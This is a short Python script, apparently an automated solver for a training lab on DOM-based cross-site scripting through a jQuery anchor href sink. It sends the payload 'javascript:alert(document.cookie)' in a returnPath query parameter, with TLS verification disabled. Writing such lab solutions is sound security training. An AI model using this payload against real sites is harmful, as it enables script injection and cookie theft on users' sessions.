import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "DOM XSS in jQuery anchor href attribute sink using location.search source"

def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload in the returnPath query parameter\n2. Observe that the alert function has been called\n""")

    path = "/feedback?returnPath="
    payload = 'javascript:alert(document.cookie)'
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False